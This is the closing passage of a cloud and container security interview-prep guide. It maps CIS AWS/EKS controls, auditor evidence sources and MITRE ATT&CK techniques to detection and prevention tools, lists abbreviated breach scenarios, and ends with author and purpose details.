| "The CSPM finding was 34 days old when it was weaponized" | Shows consequence awareness |
| "I generate audit evidence against CIS AWS Foundations Benchmark" | Directly matches JD requirement |

| CIS Control | Benchmark Reference | CSPM Enforcement |
|---|---|---|
| IMDSv2 required on all EC2 | CIS AWS 2.3.1 | Critical — SCP enforcement |
| CloudTrail enabled all regions | CIS AWS 3.1 | Critical — automated alert |
| Root account no active keys | CIS AWS 1.4 | Critical — immediate alert |
| MFA on all IAM console users | CIS AWS 1.10 | High — 24h SLA |
| S3 Block Public Access enabled | CIS AWS 2.1.5 | Critical — auto-remediate |
| EKS kubelet anonymous auth disabled | CIS EKS 3.2.1 | Critical — SCP enforcement |
| K8s secrets encrypted at rest | CIS EKS 5.3.1 | High — architecture gate |
| No system:masters in aws-auth | CIS EKS 5.1.1 | Critical — immediate alert |
| RBAC least privilege enforced | CIS K8s 5.1.3 | High — weekly audit |
| KAC blocks privileged containers | CIS K8s 5.2.2 | Critical — PREVENT mode |

| Auditor Question | Evidence Source | Your Action |
|---|---|---|
| Are S3 buckets protected from public access? | CSPM finding report — zero open public access findings | Export CSPM compliance report filtered by S3 controls |
| Are IAM policies least-privilege? | CIEM effective permissions audit | Generate CIEM access review report for privileged roles |
| Is CloudTrail enabled in all regions? | CloudTrail organization trail + CSPM finding status | Show organization trail ARN + zero disabled-region findings |
| Are container workloads scanned for vulnerabilities? | Falcon Image Assessment scan history | Export scan report with scan dates and pass/fail by image |
| Are Kubernetes RBAC permissions reviewed? | RBAC audit log + ClusterRoleBinding review output | Quarterly kubectl get clusterrolebindings review documented |
| Is runtime security deployed cluster-wide? | Falcon sensor health by node count | Show 100% node coverage report from Falcon API |

| MITRE Technique | Technique ID | Detection Tool | Prevention Control |
|---|---|---|---|
| Supply Chain Compromise | T1195.001 | Falcon CWPP (process chain) | KAC image policy + signing |
| Credentials in Files / Env Vars | T1552.001 | CSPM (build log scanning) | Secrets Manager + no env var secrets |
| Container Escape to Host | T1611 | Falcon CWPP (nsenter detection) | KAC: no privileged, no hostPID |
| Kernel Exploit for Privilege Escalation | T1068 | Falcon CWPP (Dirty Pipe signature) | seccomp RuntimeDefault profile |
| Valid Accounts — Cloud | T1078.004 | CIEM (anomalous assumption) | MFA, source VPC conditions |
| Temporary Elevated Cloud Access | T1548.005 | CIEM (role chain analysis) | IRSA SourceVpc, External-ID |
| Application Access Token Abuse | T1550.001 | CIEM (web identity external use) | aws:SourceVpc on trust policy |
| Disable Cloud Logs | T1562.008 | CloudTrail (StopLogging event) | SCP deny CloudTrail stop |
| Cloud Service Lateral Movement | T1021.007 | CIEM (cross-account chain) | Cross-account condition policy |
| Transfer to Cloud Account | T1537 | CSPM (large volume S3 transfer) | S3 Object Lock, DLP tagging |
| Cloud Service Discovery | T1526 | CIEM (first-time permission use) | CSPM: ListServices audit |
| Stage Capabilities — Upload Malware | T1608.001 | Falcon CWPP (drift detection) | Container drift PREVENT mode |

| # | Scenario | Root Cause | Detection Hero | Key Prevention |
|---|---|---|---|---|
| 1 | EC2 Metadata Service (IMDS v1) Expl... | EC2 Compromise | Falcon + CloudTrail | CSPM + KAC |
| 2 | IAM Privilege Escalation via iam:Cr... | IAM Privilege Escalation | Falcon + CloudTrail | CSPM + KAC |
| 3 | Cross-Account Role Chaining via Mis... | Cross-Account Role Abuse | Falcon + CloudTrail | CSPM + KAC |
| 4 | S3 Data Exfiltration via Presigned ... | S3 Data Exfiltration | Falcon + CloudTrail | CSPM + KAC |
| 5 | EKS RBAC Misconfiguration — Cluster... | EKS RBAC Misconfiguration | Falcon + CloudTrail | CSPM + KAC |
| 6 | Container Escape via Privileged Con... | Container Escape | Falcon + CloudTrail | CSPM + KAC |
| 7 | Container Drift — Post-Start Offens... | Drift Detection Events | Falcon + CloudTrail | CSPM + KAC |
| 8 | Malicious kubectl exec Abuse for La... | Malicious kubectl exec Abuse | Falcon + CloudTrail | CSPM + KAC |
| 9 | AWS Secrets Manager Theft via Over-... | Secrets Manager Theft | Falcon + CloudTrail | CSPM + KAC |
| 10 | IRSA External Abuse — Service Accou... | IAM Privilege Escalation | Falcon + CloudTrail | CSPM + KAC |
| 11 | EKS Node Compromise via Exposed Kub... | EC2 Compromise | Falcon + CloudTrail | CSPM + KAC |
| 12 | Supply Chain Attack — Compromised H... | Container Escape | Falcon + CloudTrail | CSPM + KAC |
| 13 | AWS Config Rule Weaponization — Per... | Cross-Account Role Abuse | Falcon + CloudTrail | CSPM + KAC |
| 14 | Cryptomining via Exposed Docker Soc... | EC2 Compromise | Falcon + CloudTrail | CSPM + KAC |
| 15 | EKS etcd Direct Access — Cluster-Wi... | EKS RBAC Misconfiguration | Falcon + CloudTrail | CSPM + KAC |


---

# 📚 Document Information

| Field | Value |
|-------|-------|
| **Author** | Gopikrishna Vallepu |
| **Purpose** | Cloud & Container Security SME Interview Preparation |
| **Target Role** | HSBC — Cybersecurity Technology Engineering (CTE) |
| **Source Files Unified** | CNAPP_Structured_Guide.md, KAC_and_Runtime_Detections_Guide.md, cloud_security_interview_guide.md, Cloud_Security_Complete_Playbook.md |
| **Total Coverage** | Theory + 30 Scenarios + Breach Simulation + Commands + MITRE + Interview Frameworks |

---

> *END OF UNIFIED GUIDE*
